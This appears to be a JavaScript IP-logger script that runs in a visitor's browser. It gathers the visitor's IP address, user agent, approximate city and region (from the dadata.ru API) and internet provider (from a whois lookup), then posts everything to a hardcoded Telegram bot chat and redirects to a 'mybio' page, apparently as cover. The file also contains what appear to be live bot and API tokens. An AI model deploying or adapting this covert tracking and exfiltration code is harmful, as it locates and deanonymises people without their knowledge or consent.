var platform = navigator.userAgent;
var logs = [];
var bot = "6845748031:AAFvO4bSVPRLLifqmPq-rnuPNq3gHMtPrTQ";
var id = 6552773647; // Telegram ID
var token = "3261abd2737639c89a0cebb8e410de165685310b"; // https://dadata.ru

function sendInformation() {
    console.log("✅ Отправлено!");

    const text = logs.join('%0A');

    var url = `https://api.telegram.org/bot${bot}/sendMessage?chat_id=${id}&parse_mode=html&text=${text}`;

    var options = {
        method: "POST",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Token " + bot
        }
    }
    
    fetch(url, options)
    .then(response => response.text())
    .then(result => location="https://saikono-telegram.github.io/mybio/")
    .catch(error => console.log("error", error));
}

function IPLocation(location) {
    let json = JSON.parse(location);

    var os = "🔻 <b>OС:</b> <code>" + platform.os + "</code>";
    var country = "🔻 <b>Страна:</b> <code>" + json.location.data.country + "</code>";
    var federal = "🔻 <b>Округ:</b> <code>" + json.location.data.federal_district + "</code>";
    var city = "🔻 <b>Город:</b> <code>" + json.location.unrestricted_value + "</code>";

    logs.push(os, country, federal, city);
}

function IPProvider(information) {
    let text = information.replace(/<[\/]*pre(.*?)>/g, '').replace(/<[\/]*span(.*?)>/g, '').split("\n");

    if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|BB|PlayBook|IEMobile|Windows Phone|Kindle|Silk|Opera Mini/i
    .test(navigator.userAgent)) {
        var provider = "🔻 <b>Провайдер:</b> <code>" + text[1].replace("netname", "").trim() + "</code>";
        var ip = "🔻 <b>Провайдер IP:</b> <code>" + text[37].replace("descr", "").trim() + "</code>";
    } 
    else {
        var provider = "🔻 <b>Провайдер:</b> <code>" + text[2].replace("descr", "").trim() + "</code>";
        var ip = "🔻 <b>Провайдер IP:</b> <code>" + text[33].replace("route", "").trim() + "</code>";
    }

    logs.push(provider, ip);

    sendInformation();
}

function getIP(json) {
	var ip = "🔻 <b>IP:</b> <code>" + json.ip + "</code>";
    logs.push(ip);

    getInfo(json.ip);

	var url = "https://suggestions.dadata.ru/suggestions/api/4_1/rs/iplocate/address?ip=";
    var query = json.ip;

    var options = {
        method: "GET",
        mode: "cors",
        headers: {
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Authorization": "Token " + token
        }
    }
    
    fetch(url + query, options)
    .then(response => response.text())
    .then(result => IPLocation(result))
    .catch(error => console.log("error", error));
}

function getInfo(ip) {
    var url = "https://whoer.net/whois?host=";
    var query = ip;

    fetch(url + query)
    .then(response => response.text())
    .then(result => IPProvider(result))
    .catch(error => console.log("error", error));
}